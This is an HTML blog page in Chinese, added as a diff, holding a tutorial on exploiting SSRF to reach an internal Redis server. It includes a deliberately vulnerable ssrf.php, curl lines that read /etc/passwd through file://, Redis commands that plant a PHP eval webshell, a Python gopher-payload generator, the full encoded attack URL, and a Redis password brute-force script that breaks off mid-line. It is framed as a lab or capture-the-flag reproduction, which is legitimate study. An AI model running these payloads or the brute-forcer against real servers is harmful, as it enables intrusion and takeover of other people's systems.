@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SSRF–(Server-side Request Forge, 服务端请求伪造) 定义：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文章测试">
+<meta property="og:url" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="chuli000&#96;s Notes">
+<meta property="og:description" content="SSRF–(Server-side Request Forge, 服务端请求伪造) 定义：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834450_6180da5233669deace58d.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834451_6180da534432dfb9ff418.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834452_6180da544a841d1685cf9.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834453_6180da555c091999c5a45.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834454_6180da5649e829acac9ad.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834455_6180da57b1c05a738a010.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834457_6180da593fa0cac2f20f6.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834458_6180da5a1e730484c4566.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834459_6180da5b0c593de8f6e59.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834459_6180da5be7e8148150a3f.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834460_6180da5cb13a5b89ff658.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834461_6180da5d98d23393e36ff.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834462_6180da5e94033a417c986.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834463_6180da5f7c3a67b0523aa.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834464_6180da609ba299ce19734.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834466_6180da62086ae4834c6fa.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834466_6180da62e5aa488d90529.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834467_6180da63af11fa56d0c73.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834468_6180da64cdad68177ac57.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834469_6180da65bf9eb06ad3c64.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834470_6180da66afa8a3812b9bd.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834472_6180da6800cbacdbdee1b.png!small">
+<meta property="og:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834473_6180da695cf2a6e665d02.png!small">
+<meta property="article:published_time" content="2021-11-07T02:41:41.000Z">
+<meta property="article:modified_time" content="2021-11-07T02:45:47.380Z">
+<meta property="article:author" content="chuli000">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/1635834450_6180da5233669deace58d.png!small">
+
+<link rel="canonical" href="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文章测试 | chuli000`s Notes</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">chuli000`s Notes</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/07/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="chuli000">
+      <meta itemprop="description" content="好风凭借力 送我上青云">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chuli000`s Notes">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文章测试
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-07 10:41:41 / 修改时间：10:45:47" itemprop="dateCreated datePublished" datetime="2021-11-07T10:41:41+08:00">2021-11-07</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SSRF–(Server-side Request Forge, 服务端请求伪造)<br>
+<strong>定义</strong>：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务</p>
+<span id="more"></span>
+<p>SSRF漏洞思维导图如下，本篇主要介绍<strong>利用SSRF漏洞攻击内网Redis</strong></p>
+<p><img src="1635834450_6180da5233669deace58d.png!small" alt="image-20210121152856276"></p>
+<h2 id="SSRF攻击内网Redis">SSRF攻击内网Redis</h2>
+<p>当存在SSRF漏洞且内网中Redis服务可以未授权访问时，利用Redis 任意文件写入成为十分常见的利用方式，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议可以攻击内网中的 Redis。</p>
+<p>在之前的文章《浅谈SSRF漏洞之基础篇》，我们了解了file, dict, gopher协议的常规利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议查看文件</span><br><span class="line">curl -v &#x27;http://sec.com/ssrf.php?url=file:///etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line"># 利用dict探测端口</span><br><span class="line">curl -v &#x27;http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#x27;</span><br><span class="line"></span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &#x27;http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>想要利用 Gopher 协议构造报文我们就必须弄清楚Redis是怎么进行数据传输的</strong>–<strong>即【RESP协议】。</strong></p>
+<h3 id="Redis传输协议–-RESP协议">Redis传输协议–[RESP协议]</h3>
+<h4 id="Redis未授权访问。">Redis未授权访问。</h4>
+<p>使用docker搭建现成的Redis未授权漏洞环境进行试验，过程如下：</p>
+<ol>
+<li><strong>获取Redis定制镜像</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 搜索镜像</span><br><span class="line">docker search ju5ton1y</span><br><span class="line"># 拉取镜像</span><br><span class="line">docker pull ju5ton1y/redis</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p><strong>运行Redis容器</strong></p>
+<p>ps:想要了解ju5ton1y/redis镜像dockerfile如何编写的同学可以看文末彩蛋~</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 运行Redis</span><br><span class="line">docker run -p 6788:6379 --name redis_test -d ju5ton1y/redis</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-p 6788:6379 # 端口映射，格式【主机(宿主)端口:容器端口】</p>
+<p>-d ju5ton1y/redis # 后台运行容器，返回容器ID</p>
+<p>–name redis_test # 命名容器</p>
+</blockquote>
+<p><img src="1635834451_6180da534432dfb9ff418.png!small" alt="image-20210119222235294"></p>
+<ol>
+<li><strong>进入容器，安装tcpdump抓包工具</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 新终端进入Redis容器</span><br><span class="line">docker exec -it redis_test /bin/bash</span><br><span class="line"></span><br><span class="line"># 将redis.conf改为无密码未授权</span><br><span class="line">sed -i &#x27;s/requirepass 123123/#requirepass 123123/g&#x27; /etc/redis.conf</span><br><span class="line"></span><br><span class="line"># 重启容器使配置生效</span><br><span class="line">docker restart redis_test</span><br></pre></td></tr></table></figure>
+<p><img src="1635834452_6180da544a841d1685cf9.png!small" alt="image-20210119222559082"></p>
+<p><img src="1635834453_6180da555c091999c5a45.png!small" alt="image-20210119224913059"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 重新进入容器安装tcpdump</span><br><span class="line">apt-get install tcpdump </span><br><span class="line"># 监听eth0网卡的6379端口，将报文保存为nopass.pcap</span><br><span class="line">tcpdump -i eth0 port 6379 -w nopass.pcap</span><br></pre></td></tr></table></figure>
+<p><img src="1635834454_6180da5649e829acac9ad.png!small" alt="image-20210119225549995"></p>
+<ol>
+<li><strong>本地客户端进行连接未授权访问，后使用Wireshark打开nopass.pcap</strong></li>
+</ol>
+<p><img src="1635834455_6180da57b1c05a738a010.png!small" alt="image-20210119230547720"></p>
+<p>查看TCP流数据，可以看到Redis的数据传输格式，结合<a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">官网</a>学习RESP协议，介绍如下：</p>
+<blockquote>
+<p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信</p>
+<p>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式</p>
+<p>RESP实际上是一个支持以下数据类型的<strong>序列化协议</strong>：</p>
+<ul>
+<li>简单字符串</li>
+<li>错误</li>
+<li>整数</li>
+<li>批量字符串</li>
+<li>数组</li>
+</ul>
+<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
+<ol>
+<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器</li>
+<li>服务器根据命令实现回复一种RESP类型</li>
+</ol>
+<p>在RESP中，某些数据的类型取决于第一个字节：</p>
+<ul>
+<li>对于客户端请求<code>Simple Strings</code>，回复的第一个字节是<code>+</code></li>
+<li>对于客户端请求<code>error</code>，回复的第一个字节是<code>-</code></li>
+<li>对于客户端请求<code>Integer</code>，回复的第一个字节是<code>:</code></li>
+<li>对于客户端请求<code>Bulk Strings</code>，回复的第一个字节是<code>$</code></li>
+<li>对于客户端请求<code>array</code>，回复的第一个字节是<code>*</code></li>
+</ul>
+<p>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。</p>
+<p>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p>
+</blockquote>
+<p>可以看到客户端将命令发送到Redis服务器的流程为</p>
+<ul>
+<li>客户端向Redis服务器发送一个仅由Bulk Strings组成的RESP Arrays</li>
+<li>Redis服务器发送任何有效RESP数据类型作为回复返回给客户端</li>
+</ul>
+<p>Bulk Strings用于表示长度最大为512 MB的单个二进制安全字符串，按以下方式编码：</p>
+<ul>
+<li><code>$字节数</code>：一个<code>$</code>后跟组成字符串的字节数，由CRLF终止。</li>
+<li>字符串数据</li>
+<li>CRLF</li>
+</ul>
+<p>字符串<code>f4ke</code>的编码如下：<code>$4\r\nf4ke\r\n</code>，如下图格式</p>
+<p><img src="1635834457_6180da593fa0cac2f20f6.png!small" alt="image-20210118161113394"></p>
+<p>RESP Arrays使用以下格式发送:</p>
+<ul>
+<li><code>*元素数</code>：<code>*</code>字符作为第一个字节，后跟数组中的元素数，后跟CRLF</li>
+<li>数组中的每个元素都附加RESP类型</li>
+</ul>
+<p>现在通过下图理解数据包：</p>
+<ul>
+<li>每一个<code>*number</code>代表每一行命令，number代表每行命令中数组中的元素个数
+<ul>
+<li>图中的<code>*3</code>，代表<code>config get dbfilename</code>这行命令的3个元素</li>
+</ul>
+</li>
+<li><code>$number</code>代表每个元素的长度
+<ul>
+<li><code>$6</code>，代表<code>config</code>长度</li>
+</ul>
+</li>
+</ul>
+<p><img src="1635834458_6180da5a1e730484c4566.png!small" alt="image-20210118161658418"></p>
+<h4 id="Redis认证访问，">Redis认证访问，</h4>
+<p><strong>修改redis.conf配置，有密码的情况下进行抓包。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 进入容器中修改配置文件</span><br><span class="line">sed -i &#x27;s/# requirepass 123123/requirepass 123123/g&#x27; /data/redis/redis.conf</span><br><span class="line"># 重启docker容器</span><br><span class="line">docker restart redis_test</span><br><span class="line"># 监听eth0网卡的6379端口，将报文保存为pass.pcap</span><br><span class="line">tcpdump -i eth0 port 6379 -w pass.pcap</span><br></pre></td></tr></table></figure>
+<p>wireshark追踪TCP流：</p>
+<p><img src="1635834459_6180da5b0c593de8f6e59.png!small" alt="image-20210120101156767"></p>
+<p><code>/tmp</code>下成功被写入shell.php</p>
+<p><img src="1635834459_6180da5be7e8148150a3f.png!small" alt="image-20210120102349713"></p>
+<p>可以看到在每次请求命令执行之前都使用下面格式进行验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">AUTH</span><br><span class="line">$6</span><br><span class="line">123123</span><br></pre></td></tr></table></figure>
+<p>官方文档中提到：<strong>客户端可以通过一个写操作发送多个命令，而不需要在发出下一个命令之前读取上一个命令的服务器应答</strong>。</p>
+<p><strong>因此，在具有认证(弱口令)的情况下，我们依然可以进行与未授权相同的攻击方式，只需要在攻击脚本中加上验证数据即可。</strong></p>
+<h3 id="SSRF攻击复现">SSRF攻击复现</h3>
+<h4 id="Redis未授权访问">Redis未授权访问</h4>
+<p>测试环境：</p>
+<blockquote>
+<p>受害机：腾讯云主机 php7.2 (安装curl扩展)+ apache2 + redis6.0.6</p>
+<p>攻击机：windows10</p>
+</blockquote>
+<p>开局给出一段ssrf漏洞代码，利用它找到flag~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ssrf.php</span><br><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init(); //创建新的 cURL 资源</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&#x27;url&#x27;]); //设置URL 和相应的选项</span><br><span class="line"># curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line"># curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">curl_exec($ch);   //抓取 URL 内容并把它传递给浏览器，存储进文件</span><br><span class="line">curl_close($ch);  //关闭 cURL 资源，并且释放系统资源</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="1635834460_6180da5cb13a5b89ff658.png!small" alt="image-20210120165807075"></p>
+<p>使用dict协议来进行探测内网的主机存活与端口开放情况，使用burpsuite工具设置爆破1000-9000端口，爆破结果如下，6788端口存在redis服务。</p>
+<p><img src="1635834461_6180da5d98d23393e36ff.png!small" alt="image-20210120165542929"></p>
+<p>且本地无法访问云主机的6788redis端口，其Redis服务只面向云主机所在的内网。</p>
+<p><img src="1635834462_6180da5e94033a417c986.png!small" alt="image-20210120165514692"></p>
+<p><strong>初步思路</strong>：构造Redis命令写入webshell，尝试使用中国蚁剑连接查找flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;&lt;?php eval($_POST[\&quot;f4ke\&quot;]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 5he1l.php</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>根据RESP协议使用七友师傅编写的python脚本<code>redisSsrf.py</code>，将上述命令转换为gopher payload。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = &quot;gopher://&quot;</span><br><span class="line">ip = &quot;127.0.0.1&quot;</span><br><span class="line">port = &quot;6788&quot;</span><br><span class="line">shell = &quot;\n\n&lt;?php eval($_POST[\&quot;f4ke\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename = &quot;5he1l.php&quot;</span><br><span class="line">path = &quot;/var/www/html&quot;</span><br><span class="line">passwd = &quot;&quot;</span><br><span class="line">cmd = [&quot;flushall&quot;,</span><br><span class="line">     &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),  </span><br><span class="line">     &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line">     &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line">     &quot;save&quot;,</span><br><span class="line">     &quot;quit&quot;</span><br><span class="line">    ]</span><br><span class="line">if passwd:</span><br><span class="line">    cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class="line">payload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF = &quot;\r\n&quot;</span><br><span class="line">    redis_arr = arr.split(&quot; &quot;)</span><br><span class="line">    cmd = &quot;&quot;</span><br><span class="line">    cmd += &quot;*&quot; + str(len(redis_arr))</span><br><span class="line">    for x in redis_arr:</span><br><span class="line">        cmd += CRLF + &quot;$&quot; + str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)))) + CRLF + x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    return cmd</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    for x in cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line"></span><br><span class="line">    # print(payload)</span><br><span class="line">    print(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure>
+<p>执行<code>redisSsrf.py</code>脚本，生成payload，</p>
+<p><img src="1635834463_6180da5f7c3a67b0523aa.png!small" alt="image-20210121102100251"></p>
+<p>放入url参数浏览器请求如下，成功执行Redis命令写入webshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx.xx:8000/ssrf.php?url=gopher%3A//127.0.0.1%3A6788/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252433%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522f4ke%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250A5he1l.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</span><br></pre></td></tr></table></figure>
+<p><img src="1635834464_6180da609ba299ce19734.png!small" alt="image-20210121095445185"></p>
+<p>使用中国蚁剑建立连接，文件即为我们刚刚写入的<code>5he1l.php</code>，密码为<code>f4ke</code></p>
+<p><img src="1635834466_6180da62086ae4834c6fa.png!small" alt="image-20210120172105728"></p>
+<p>保存数据右键文件管理，即可找到flag文件。</p>
+<p><img src="1635834466_6180da62e5aa488d90529.png!small" alt="image-20210120172241143"></p>
+<p><img src="1635834467_6180da63af11fa56d0c73.png!small" alt="image-20210120172308517"></p>
+<h4 id="Redis弱口令认证">Redis弱口令认证</h4>
+<p>测试环境：</p>
+<blockquote>
+<p>受害机：腾讯云主机 php7.2 (安装curl扩展)+ apache2 + redis6.0.6</p>
+<p>攻击机：windows10</p>
+</blockquote>
+<p>浏览器访问返回如下：未对请求进行密码认证。</p>
+<p><img src="1635834468_6180da64cdad68177ac57.png!small" alt="image-20210121110647323"></p>
+<p>我们进一步利用dict协议，使用下面的格式尝试认证密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/命令:参数</span><br><span class="line">dict://127.0.0.1:6788/auth:123456</span><br></pre></td></tr></table></figure>
+<p>使用<code>auth:123456</code>，返回结果：</p>
+<p><img src="1635834469_6180da65bf9eb06ad3c64.png!small" alt="image-20210121140919331"></p>
+<p>使用<code>auth:123123</code>，返回结果：</p>
+<p><img src="1635834470_6180da66afa8a3812b9bd.png!small" alt="image-20210121141016108"></p>
+<p>通过两次响应结果，可以确定Redis的密码为123123，</p>
+<p>因此在面对内网redis认证的情况下，可以利用dict或者gopher等协议编写脚本尝试爆破Redis口令，简单实现爆破脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.parse </span><br><span class="line"></span><br><span class="line">url = &quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span><br><span class="line"></span><br><span class="line">param = &#x27;dict://127.0.0.1:6788/auth:&#x27;</span><br><span class="line"></span><br><span class="line">with open(r&#x27;d:\test\top100.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for i in range(100):</span><br><span class="line">        passwd = f.readline()</span><br><span class="line">        all_url = url + param + passwd</span><br><span class="line">        # print(all_url)</span><br><span class="line">        request = urllib.request.Request(all_url)</span><br><span class="line">        response = urllib.request.urlopen(request).read()</span><br><span class="line">        # print(response)</span><br><span class="line">        if 